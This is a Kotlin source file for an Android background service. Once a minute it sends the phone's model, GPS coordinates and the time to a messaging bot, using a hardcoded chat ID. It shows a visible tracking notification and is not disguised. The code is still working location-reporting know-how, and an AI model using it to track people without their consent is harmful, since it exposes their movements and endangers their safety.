package dev.abrorjon755.gpslocation.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import dev.abrorjon755.gpslocation.R
import dev.abrorjon755.gpslocation.data.sendMessageToBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Runnable
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.time.LocalTime

class GpsLocationService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val interval = 60000L
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    private val runnable = object : Runnable {
        @RequiresApi(Build.VERSION_CODES.O)
        override fun run() {
            serviceScope.launch {
                getCurrentLocationAndSend()
            }
            handler.postDelayed(this, interval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("SERVICE", "GpsLocationService started")
        startForeground(1, createNotification())

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        handler.post(runnable)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("SERVICE", "GpsLocationService stopped")
        handler.removeCallbacks(runnable)
        serviceScope.cancel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    @RequiresApi(Build.VERSION_CODES.O)
    @SuppressLint("MissingPermission")
    private fun getCurrentLocationAndSend() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e("SERVICE", "Location permission not granted")
            return
        }

        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
            if (location != null) {
                val deviceName = Build.MODEL
                val message = """
                    Device name: $deviceName
                    Latitude: ${location.latitude}, Longitude: ${location.longitude}
                    Time: ${LocalTime.now()}
                    """.trimIndent()
                Log.d("SERVICE", "Location: $message")

                serviceScope.launch {
                    try {
                        sendMessageToBot("1100168676", message)
                        Log.d("SERVICE", "Message sent successfully")
                    } catch (e: Exception) {
                        Log.e("SERVICE", "Error sending message: ${e.message}")
                    }
                }
            } else {
                Log.e("SERVICE", "Failed to get location")
            }
        }.addOnFailureListener { e ->
            Log.e("SERVICE", "Error fetching location: ${e.message}")
        }
    }

    private fun createNotification(): Notification {
        val channelId = "gps_service_channel"
        val channelName = "GPS Service"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel =
                NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("GPS Tracking Service")
            .setContentText("Running in the background...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
